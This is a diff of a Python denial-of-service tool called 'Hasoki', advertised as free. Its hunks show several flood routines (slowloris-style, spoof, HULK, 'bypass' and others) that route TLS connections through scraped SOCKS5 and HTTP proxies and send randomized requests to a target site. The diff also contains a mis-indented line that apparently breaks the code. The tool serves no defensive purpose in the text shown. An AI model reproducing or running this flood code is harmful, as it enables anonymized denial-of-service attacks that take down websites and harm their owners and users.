@@ -1,9 +1,9 @@
 # -*- coding: utf-8 -*-
 # From NV with love
-# Hasoki v1.2
+# Hasoki v1.1
 # All for FREE
 from os import system, name
-import httpx
+#import httpx
 import undetected_chromedriver as webdriver
 from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
@@ -163,6 +163,7 @@ method = [
     "POST",
     "HEAD",
 ]
+#get proxy http
 #socks5resource
 proxyResources = [
     'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
@@ -730,7 +731,7 @@ def Launchslow(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
             s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
@@ -823,7 +824,7 @@ def Launchspoof(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -861,7 +862,7 @@ def LaunchSKY(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -871,7 +872,7 @@ def LaunchSKY(url, timer):
             except:
                 s.close()
         except:
-            s.close()
+        s.close()
 #sky
 def attackPXHULK(url, timer, threads):
     for i in range(int(threads)):
@@ -899,7 +900,7 @@ def LaunchPXHULK(url, timer):
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -937,7 +938,7 @@ def Launchbypass(url, timer):
             s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
@@ -970,7 +971,7 @@ def LaunchSTELLAR(url, timer):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext()
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
